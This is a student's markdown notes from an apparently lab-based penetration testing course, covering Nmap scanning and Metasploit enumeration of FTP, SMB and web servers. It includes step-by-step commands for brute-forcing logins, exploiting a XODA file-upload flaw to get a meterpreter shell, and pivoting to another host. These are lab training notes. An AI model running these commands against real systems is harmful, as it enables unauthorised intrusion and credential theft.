# 03_Enumeration

## Nmap Scripting Engine (NSE)

### Discover, Scan and Export NMAP Scan Results (Example)

Discover available live hosts and their open ports using Nmap and identify the running services and applications.
 
- ping demo.ine.local --> bocked
- nmap demo.ine.local --> blocked
- nmap -Pn demo.ine.local --> worked
- nmap -Pn -sV -O demo.ine.local --> for ServiveVersion and OSVersion
- nmap -Pn -sV -O demo.ine.local -oX windows_server_2012 --> Creates xml file and inserts informations

### Nmap Output Formats

 - `-oN` = normal format, saves result how you see it 
 - `-oX` = xml format, offers a conversion layer and import it into metasploit framework 
 - `-oS` = Script kiddie
 - `-oG` = outputs scan results in grepable format
 - `-oA` = all 3 normal formats at once (oN, oX, oG) 
 - `-v` = Increase verbosity 
 - `--reason` = displays the reason a port is in a particular state
 - Example: `nmap -Pn -sS -F -T4 [target IP] -oN \path\filename.txt`

### Import nmap scan results in metasploit framework (xml format output):
- `service postgresql start`
- `msfconsole`
- msf6: `workspace -h`
- msf6: `workspace -a pentest_1`
- msf6: `workspace`
- msf6: `db_status`, check status, is msf connected to the postgresql database where the data is stored?
- msf6s: `dbimport nmap_xml.xml`
- msf6s: `hosts`
- msf6: `services`
- msf5: `nmap -Pn -sS -sV -O -p445 [target IP] `
- msf6s: `hosts`, metasploit framework updates file
- Grepable Format: `nmap -Pn -sS -F -T4 [target IP] -oG nmap_grep.txt`
- `cat nmap_gep.txt`, we see that its a grepable format

### Importing Nmap Scan Results into MSF

- Exporting Nmap scan: `nmap -Pn -sV -O -oX nmapscan.xml demo.ine.local`
- Start postgresql database service: `service postgresql start`
- Start the Metasploit Framework console: `msfconsole`
- Verify that the MSF database is connected: `db_status`
- Import the the Nmap Scan Results: `db_import nmapscan.xml`
- Check the results: `hosts` and `services`

### Auxiliary Modules
An Auxiliary Module is a type of module within a system that includes exploits without payloads and enhances the functionality of the system by performing tasks like remote system scanning and fingerprinting. They are used to perform functionality, discovery and fuzzing. Against NMAP scans, auxiliary modules are more effective in the post-exploitation phase because they allow us to identify whether the server or PC, whose IP we have, is part of an internal network. Additionally, this may enable us to exploit other devices.

**Set Global Variable**
- `setg RHOST 192.117.32.3`

**Practical:**
- First check your IP address: `ifconfig`
- Make sure the postgreSQL service is started: `service postgresql start`
- Start msfconsole: `msfconsole`
- Check Database status: `db_status` If connection type = postgresql everything is allright.
- Add a Workspace: `workspace -a "examplename"`
- You can check the current workspace your working in with`workspace` (the res star shows your selected workspace)
- You can change the current workspace with `workspace "name of the workspace you want"`
- Search Auxiliary Modules: `search (portscan)`
- You can select and use a module by: `use (name of the module or number)`
- `show options`
- Set the RHOST `set RHOSTS 192.168.20.3`
- execute the module: `run`
- downloading the webpage of the IP adress to what we can identify: `curl 192.168.20.3`

**Run udp_sweep**
- `search udP_sweep`
- `run auxiliary/scanner/discovery/udp_sweep`
- `show options`
- `set RHOST 192.168.20.3`
- `run`

**Exploiting XODA-Service (what we just curled)**
- `search Xoda`
- `use exploit/unix/webapp/xoda_file_upload`
- `show options`
- `set RHOSTS 192.168.20.3`
- set Path on the Xoda device to root: `set TARGETURI /`
- run our exploit: `exploit`
- It did not work Problemsolving: I had to set LHOST because I have bound to a loopback address by default(127.0.0.1): `set LHOST 192.198.6.2`(my IP)
- `exploit` run exploit again, it worked and we received a meterpreter session.
- `sysinfo` to get Informations of the Targentmachine
- We want to execute a Portscan on the second machine in the network:
- `shell` open shell session
- `/bin/bash -i` spawn a bash session to run commands easily
- `ifconfig` to get the Target IP
- Ctrl C to go back to meterpreter
- `run autorun -s 192.102.202.2` set the address route and provide the subnet
- `background` background session 1
- `sessions` view your sessions
- `search portscan`
- `use 5`
- `set RHOSTS 192.102.202.3`
- Because we already configured the route(so that the Scan comes from the exploited machine) we can run the scan: `run`
- leave module: `back`

## Service Enumeration

### FTP Enumeration

FTP(File Transfer Protocol) uses TCP port 21 and is used to facilitate file sharing between a server and clients.
NOTE: FTP authentication utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

### FTP Enumoration Practical:

**FTP Service Version Enumeration**
- `service postgresql start`
- `ifconfig`
- `msfconsole`
- `workspace -a FTP_ENUM`
- `search portscan`
- `use auxiliary/scanner/portscan/tcp`
- `options`
- `set RHOST` 192.10.156.3
- `run` --> FTP service is running
- `search ftp` are to much modules, specify the search --> `search type:auxiliary name:ftp`
- `use auxiliary/scanner/ftp/ftp_version`
- `set RHOST 192.10.156.3`
- `run`

![image](https://github.com/user-attachments/assets/eab00222-7a14-4ba3-ad0b-1c8a07c48fcf)

**Enumorate Brutforce Module**
- `use auxiliary/scanner/ftp/ftp_login`
- `options`
- `set RHOST 192.94.227.3`
- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt` set the most common usernames
- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` set the most common passwords
- `run`

**FTP Anonymous Login Module**
- `search type:auxiliary name:ftp`
- `use auxiliary/scanner/ftp/anonymous`
- `options`
- `set RHOST 192.94.227.3`
- `run`
- In our case id didn`t work
- `exit`
- `ftp 192.94.227.3` connect to ftp, afterwards type in user and password
- `get secret.txt`
- `cat secret.txt`

### SMB Enumeration

SMB(Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and devices between computer on a local network. Now SMB uses port 445(TCP), originally, SMB ran ob top of NetBIOS using port 139.
SAMBA is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

### SMB Enumeration Practical:

**SMB Service Version Enumeration**
- `service postgresql start`
- `ifconfig`
- `msfconsole`
- `workspace -a SMB_ENUM`
- `workspace`
- `search SMB`
- `search type:auxiliary name:smb`
- `use auxiliary/scanner/smb/smb_version`
- `options`
- `setg RHOSTS 192.117.32.3`
- `run`

![image](https://github.com/user-attachments/assets/49f40e3f-2727-47c9-9f90-c78726bfd592)

**Try to enumorate SMB Users and Shares**
- `search type:auxiliary name:smb`
- `use auxiliary/scanner/smb/smb_enumusers`
- `options`
- `run` = we found some interesting Users, now we look for shares
- `search type:auxiliary name:smb`
- `use auxiliary/scanner/smb/smb_enumshares`
- `options`
- `set ShowFiles true` = so we get detailed information while spidering
- `run` = now we see the Users that are in the Share

![image](https://github.com/user-attachments/assets/c09d6faf-d84f-43a7-8c0d-e9fcb79b872c)

**Brutforce these Users**
- `search smb_login`
- `use auxiliary/scanner/smb/smb_login`
- `options`
- `set SMBUser admin` set username to brutforce
- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` ser password file
- `set STOP_ON_SUCCESS true` The brutforce will stop if we succeeded
We actually found one:

![image](https://github.com/user-attachments/assets/dc95fe80-2308-4e6e-a483-c76c6ee0bc61)

**Connect with the SMBClient**
- `smbclient -L \\\\192.217.223.3\\ -U admin` List the available shares with the user admin
- then it asks you for the password(you can give in the correct password from before)

![image](https://github.com/user-attachments/assets/c2db7922-cac4-4e33-8e4e-2dba66cd2e82)

- `smbclient \\\\192.217.223.3\\public -U admin` Access the share of the user public with the user admin
When your in the smb console it should look like this:y<

![image](https://github.com/user-attachments/assets/fc568a9c-2b9b-4a28-a448-c005701fd8be)

- `cd secret` to find the flag in the secret folder
- `ls`
- `get flag`
- `exit`
- `cat flag`

**Find NetBIOS computername of the samba server:**
- `nmblookup -A 192.217.223.3` With nmblookup
- `nmap --script smb-os-discovery.nse -p 445 192.217.223.3` With NMAP

![image](https://github.com/user-attachments/assets/d563c97d-97ba-4282-a2a5-d8ece667b519)


### Web Server Enumeration

Web servers utilize HTTP (Hypertext Transfer Protocol) to facilitate the communication between clients and the web server. HTTP is an application layer protocol that utilizes TCP port 80 for communication. When you set up a SSL certificate for encription, the is called HTTPS (Hypertext Transfer Protocol Secure) and utilizes TCP port 443.
Additionally, important to note is the robots.txt file. The robots.txt file ist stored at the root of a webserver and is used to prevent search engines from indexing specific directorys and files, that are hosted on that web server.

### Web Server Enumeration Practical:

**Web Server Version Enumeration**
- `service postgresql start`
- `msfconsole`
- `workspace -a WEB_ENUM`
- `ifconfig`
- `setg RHOSTS 192.118.217.3`
- `setg RHOST 192.118.217.3`
- `search HTTP`
- `search type:auxiliary name:HTTP`
- `use auxiliary/scanner/http/http_version`
- `options` = RHOSTS is already set. We are dealing with a Webserver without an SSL Certificate, so we can use port 80 and set the value to false, if your Webserver uses HTTPS you have to change this.
- `run`

![image](https://github.com/user-attachments/assets/4c855d6c-ddef-4468-be04-464d12ff1160)

**HTTP_Header Enumeration**
- `search http_header`
- `use auxiliary/scanner/http/http_header`
- `options`
- `run`

![image](https://github.com/user-attachments/assets/bcf7c393-1c44-4a6b-9796-82e2e5d41d34)

**robots.txt file Enumeration**
- `search robots_txt`
- `use auxiliary/scanner/http/robots_txt`
- `options`
- `run`

![image](https://github.com/user-attachments/assets/73357b9f-97d2-48c9-b805-39f92d787d90)

- `curl http://192.188.17.3/data/`
- `curl http://192.188.17.3/secure/`

![image](https://github.com/user-attachments/assets/26fb24c2-672c-42c1-8580-912acc06892b)

- This means this sections is password secured

**Directory bruteforce**
- `search dir_scanner`
- `use auxiliary/scanner/http/dir_scanner`
- `options`
- `run`

**File bruteforce**
- `search files_dir`
- `use auxiliary/scanner/http/files_dir`
- `options`
- `run`

**Bruteforce to get Webserver User and PW**
- `search http_login`
- `use auxiliary/scanner/http/http_login`
- `options`
- `set AUTH_URI /secure/` Set the right URI, in this case we want to brutforce the credentials to the secure directory.
- `unset USERPASS_FILE` unset userpassword file because we already have user and password file.
- `run`
- If this does not work you can try with another passwordsfile
- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `set VERBOSE false` that the script will not print all failed attemps
- IF this does not work you can try to enumerate the users first. Because apache with the UserDir directive enabled generates diffrent error codes when a username exists which can allow to determine valid usernames on the server.
- `search apache_userdir_enum`
- `use search apache_userdir_enum`
- `options`
- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `run`
- We can now run the bruteforce again with the detected username/s
- `use auxiliary/scanner/http/http_login`
- `options`
- `echo "alice, backup, bin, bob, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, proxy, sync, sys, uucp" > users.txt`make a new file with the usernames in it
- `set USER_FILE users.txt`
- `unset USERPASS_FILE`
- `run`

![image](https://github.com/user-attachments/assets/0039f3c9-ef47-44a9-a780-c3c0dc230598)


